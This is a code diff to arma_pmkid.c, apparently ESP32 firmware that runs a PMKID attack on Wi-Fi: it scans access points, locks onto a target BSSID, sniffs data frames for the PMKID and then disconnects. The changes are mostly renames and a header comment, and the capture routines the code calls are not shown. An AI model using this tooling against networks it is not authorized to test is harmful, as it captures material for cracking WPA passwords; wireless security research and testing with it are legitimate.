@@ -1,3 +1,9 @@
+/*
+ * @file arma_pmkid.c
+ * @author johndeweyzxc (johndewey02003@gmail.com)
+ * @brief Implementation of methods for orchestrating the PMKID attack
+ */
+
 #include "arma_pmkid.h"
 
 #include <stdio.h>
@@ -17,46 +23,45 @@ ESP_EVENT_DECLARE_BASE(ARMAMENT_ATTACK_STATUS_EVENT_BASE);
 static TaskHandle_t pmkid_sniff_task_handle = NULL;
 static uint8_t int_target_bssid[6];
 
-static void attack_notification(void *args, esp_event_base_t event_base,
-                                int32_t event_id, void *event_data) {
+static void pmkid_notif(void *args, esp_event_base_t event_base,
+                        int32_t event_id, void *event_data) {
   arma_atk_event_data_t *notification_data;
   notification_data = (arma_atk_event_data_t *)event_data;
 
   if (notification_data->atk_context == PMKID_BASED) {
-    printf("arma_pmkid.attack_notification > Received notification\n");
-    arma_pmkid_attack_cleanup_sequence(0);
+    printf("arma_pmkid.pmkid_notif > Received notification\n");
+    arma_pmkid_finishing_sequence(0);
   }
 }
 
 void arma_pmkid_notif_event_register() {
   ESP_ERROR_CHECK(esp_event_handler_register(ARMAMENT_ATTACK_STATUS_EVENT_BASE,
-                                             ATK_STATS_EVENT_ID,
-                                             &attack_notification, NULL));
+                                             ATK_STATS_EVENT_ID, &pmkid_notif,
+                                             NULL));
   printf("arma_pmkid.arma_pmkid_notif_event_register > *\n");
 }
 
 void arma_pmkid_notif_event_unregister() {
-  ESP_ERROR_CHECK(
-      esp_event_handler_unregister(ARMAMENT_ATTACK_STATUS_EVENT_BASE,
-                                   ATK_STATS_EVENT_ID, &attack_notification));
+  ESP_ERROR_CHECK(esp_event_handler_unregister(
+      ARMAMENT_ATTACK_STATUS_EVENT_BASE, ATK_STATS_EVENT_ID, &pmkid_notif));
   printf("arma_pmkid.arma_pmkid_notif_event_unregister > *\n");
 }
 
-void delete_arma_task_pmkid_sniff_duration() {
+void arma_delete_task_pmkid_sniff_duration() {
   if (pmkid_sniff_task_handle != NULL) {
     vTaskDelete(pmkid_sniff_task_handle);
     pmkid_sniff_task_handle = NULL;
   }
 }
 
-void arma_pmkid_attack_cleanup_sequence(uint8_t from_sniff_task) {
-  frame_parser_clear_target_param();
+void arma_pmkid_finishing_sequence(uint8_t from_sniff_task) {
+  frame_parser_clear_target_parameter();
   frame_parser_unregister_data_frame_handler();
   arma_pmkid_notif_event_unregister();
   wifi_sniffer_stop();
   wifi_disconnect_from_ap(int_target_bssid);
   if (from_sniff_task == 0) {
-    delete_arma_task_pmkid_sniff_duration();
+    arma_delete_task_pmkid_sniff_duration();
   }
 }
 
@@ -67,14 +72,14 @@ void arma_pmkid_sniff_duration() {
            int_target_bssid[0], int_target_bssid[1], int_target_bssid[2],
            int_target_bssid[3], int_target_bssid[4], int_target_bssid[5]);
 
-    arma_pmkid_attack_cleanup_sequence(1);
+    arma_pmkid_finishing_sequence(1);
     vTaskDelete(NULL);
     pmkid_sniff_task_handle = NULL;
   }
 }
 
-void arma_launch_pmkid_attack_sequence(uint8_t *ssid_name, uint8_t ssid_len,
-                                       uint8_t channel) {
+void arma_pmkid_launching_sequence(uint8_t *ssid_name, uint8_t ssid_len,
+                                   uint8_t channel) {
   frame_parser_set_target_parameter(int_target_bssid, PARSE_PMKID);
   frame_parser_register_data_frame_handler();
   arma_pmkid_notif_event_register();
@@ -147,7 +152,7 @@ void arma_pmkid(char *target_bssid) {
 
   for (uint16_t i = 0; i < total_scanned_aps; i++) {
     wifi_ap_record_t ap_record = ap_records[i];
-    output_ap(&ap_record);
+    output_ap_info(&ap_record);
 
     if (memcmp(ap_record.bssid, int_target_bssid, 6) == 0) {
       uint8_t ssid_len = calc_len_ssid_name(ap_record.ssid);
@@ -158,7 +163,7 @@ void arma_pmkid(char *target_bssid) {
              bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
       printf("arma_pmkid.arma_pmkid > Channel of ap is %u\n", channel);
 
-      arma_launch_pmkid_attack_sequence(ap_record.ssid, ssid_len, channel);
+      arma_pmkid_launching_sequence(ap_record.ssid, ssid_len, channel);
       break;
     }
   }
